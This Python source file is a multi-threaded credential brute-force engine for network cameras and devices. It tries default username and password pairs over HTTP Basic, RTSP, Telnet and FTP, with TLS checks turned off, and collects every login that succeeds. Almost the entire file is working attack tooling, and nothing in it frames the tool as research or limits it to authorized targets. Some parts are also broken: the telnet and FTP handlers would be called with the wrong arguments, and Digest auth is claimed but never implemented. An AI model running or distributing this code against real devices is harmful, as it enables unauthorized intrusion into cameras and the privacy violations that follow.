"""
Password brute-force module for network cameras and devices.
Supports HTTP Basic/Digest, RTSP, and telnet authentication attempts.
"""

import socket
import threading
import time
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import ssl

from camera_ports import DEFAULT_CAMERA_CREDS


# ---------------------------------------------------------------------------
# Protocol-specific brute force attempts
# ---------------------------------------------------------------------------

def _try_http_basic(ip: str, port: int, username: str, password: str,
                    timeout: float = 3.0) -> bool:
    """Try HTTP Basic Auth against a web endpoint."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"

    try:
        credentials = f"{username}:{password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        req = Request(url)
        req.add_header("Authorization", f"Basic {encoded}")
        req.add_header("User-Agent", "Mozilla/5.0")
        resp = urlopen(req, timeout=timeout, context=ssl_ctx)
        if 200 <= resp.status < 300:
            return True
    except HTTPError as e:
        # 401 = auth required but creds wrong, others may indicate success
        if e.code == 401:
            return False
        # Some camera servers return 200 even for failed auth via redirect
    except (URLError, socket.timeout, OSError):
        pass
    return False


def _try_rtsp_auth(ip: str, port: int, username: str, password: str,
                   timeout: float = 3.0) -> bool:
    """Try RTSP DESCRIBE with credentials."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # Build RTSP DESCRIBE with Basic auth
        credentials = f"{username}:{password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        request = (
            f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {encoded}\r\n"
            f"User-Agent: RTSP Client\r\n"
            f"\r\n"
        )
        sock.sendall(request.encode())
        response = sock.recv(4096)
        sock.close()

        response_str = response.decode("utf-8", errors="replace")
        # RTSP 401 = Unauthorized, 200 = OK
        if "RTSP/1.0 200" in response_str:
            return True
    except (socket.timeout, OSError):
        pass
    return False


def _try_telnet_auth(ip: str, username: str, password: str,
                     timeout: float = 3.0) -> bool:
    """Try telnet login."""
    try:
        import telnetlib
        tn = telnetlib.Telnet(ip, 23, timeout=timeout)
        tn.read_until(b"login: ", timeout=timeout)
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ", timeout=timeout)
        tn.write(password.encode() + b"\n")
        time.sleep(1)
        idx, _, _ = tn.expect([b"Login incorrect", b"#", b"$", b">"], timeout=4)
        tn.close()
        return idx >= 1  # indices 1-3 mean success
    except (EOFError, TimeoutError, Exception):
        pass
    return False


def _try_ftp_auth(ip: str, username: str, password: str,
                  timeout: float = 3.0) -> bool:
    """Try FTP login."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 21))
        banner = sock.recv(1024)  # skip banner
        sock.sendall(f"USER {username}\r\n".encode())
        sock.recv(1024)
        sock.sendall(f"PASS {password}\r\n".encode())
        response = sock.recv(1024).decode("utf-8", errors="replace")
        sock.close()
        return "230" in response
    except (socket.timeout, OSError):
        pass
    return False


# ---------------------------------------------------------------------------
# Brute Force Engine
# ---------------------------------------------------------------------------

# Map protocol to handler function and typical ports
PROTOCOL_HANDLERS = {
    "HTTP": (_try_http_basic, [80, 8080, 8000, 8081, 8090, 8443, 443]),
    "RTSP": (_try_rtsp_auth, [554, 8554, 5540]),
    "Telnet": (_try_telnet_auth, [23, 2323]),
    "FTP": (_try_ftp_auth, [21]),
}


class BruteForceScanner:
    """Multi-protocol brute-force engine."""

    def __init__(
        self,
        targets: list,  # list of {"ip": ..., "port": ...} dicts
        credentials: list = None,
        protocols: list = None,
        max_threads: int = 30,
        timeout: float = 3.0,
        on_result: Optional[Callable] = None,
        on_progress: Optional[Callable] = None,
    ):
        self.targets = targets
        self.credentials = credentials or DEFAULT_CAMERA_CREDS
        self.protocols = protocols or list(PROTOCOL_HANDLERS.keys())
        self.max_threads = max_threads
        self.timeout = timeout
        self.on_result = on_result
        self.on_progress = on_progress
        self._stop_event = threading.Event()
        self.results = []
        self._lock = threading.Lock()

    def stop(self):
        self._stop_event.set()

    def _try_target_credential(self, target, protocol, username, password):
        """Try one credential pair against one target using one protocol."""
        if self._stop_event.is_set():
            return None

        handler_fn, allowed_ports = PROTOCOL_HANDLERS.get(protocol)
        if not handler_fn:
            return None

        ip = target["ip"]
        # Use target port if it matches protocol, otherwise try default ports
        target_port = target.get("port", 0)
        ports_to_try = []
        if target_port in allowed_ports:
            ports_to_try = [target_port]
        else:
            ports_to_try = allowed_ports

        for port in ports_to_try:
            if self._stop_event.is_set():
                return None
            try:
                success = handler_fn(ip, port, username, password, self.timeout)
                if success:
                    result = {
                        "ip": ip,
                        "port": port,
                        "protocol": protocol,
                        "username": username,
                        "password": password,
                        "found": True,
                    }
                    with self._lock:
                        self.results.append(result)
                    if self.on_result:
                        self.on_result(result)
                    return result
            except Exception:
                continue
        return None

    def scan(self):
        """Run brute-force scan using thread pool."""
        self.results = []
        self._stop_event.clear()

        # Build job list: target x protocol x credential
        jobs = []
        for target in self.targets:
            for protocol in self.protocols:
                for username, password in self.credentials:
                    jobs.append((target, protocol, username, password))

        total = len(jobs)
        completed = 0

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(
                    self._try_target_credential, t, p, u, pw
                ): (t, p, u, pw)
                for t, p, u, pw in jobs
            }
            for future in as_completed(futures):
                if self._stop_event.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                completed += 1
                if self.on_progress and completed % 50 == 0:
                    self.on_progress(completed, total)

        if self.on_progress:
            self.on_progress(completed, total)

        return self.results


def default_camera_credentials():
    """Return list of (username, password) tuples for camera defaults."""
    return list(DEFAULT_CAMERA_CREDS)